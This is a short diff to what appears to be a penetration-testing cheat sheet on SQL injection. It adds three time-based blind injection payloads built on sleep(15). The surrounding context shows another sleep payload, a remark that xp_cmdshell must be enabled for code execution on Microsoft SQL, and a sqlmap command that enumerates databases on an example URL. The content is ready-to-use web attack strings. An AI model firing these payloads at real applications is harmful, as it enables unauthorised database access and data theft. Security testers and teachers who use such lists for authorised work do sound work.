@@ -37,6 +37,12 @@ Blind SQL:
 ' AND IF (1=1, sleep(3),'false') -- //
 ```
 
+```
+' or sleep(15) and 1=1#
+' or sleep(15)#
+' union select sleep(15),null#
+```
+
 Code Execution : xp_cmdshell in Microsoft SQL need to be enable to work this.
 
 ```
@@ -119,4 +125,6 @@ sqlmap -u "https://www[.]example[.]com/something/thing/filter-thing.php?vulnerab
 ```
 --batch --threads=10 --dbs
 ```
+
+
 
